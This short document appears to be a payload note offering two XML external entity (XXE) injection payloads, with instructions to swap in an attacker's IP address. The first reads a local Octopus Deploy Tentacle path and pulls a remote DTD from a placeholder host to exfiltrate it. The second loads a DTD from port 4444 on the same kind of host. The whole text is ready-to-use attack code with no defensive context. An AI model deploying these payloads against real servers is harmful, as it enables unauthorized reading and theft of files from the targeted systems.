SERVER SIDE
-----------

Use these on the server side. Remember to change the IP address. Also change relevant IP address in the corresponding DTD

Payload 1
-----
`
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///Octopus Deploy/Tentacle/">
<!ENTITY % sp SYSTEM "http://x.x.x.x/sp.dtd">
%sp;
%param2;
%exfil;
]>
`

Payload 2
-----
`
<?xml version="1.0" ?>
<!DOCTYPE a [
<!ENTITY % asd SYSTEM "http://x.x.x.x:4444/sp2.dtd">
%asd;
%c;
]>
<a>&rrr;</a>
`
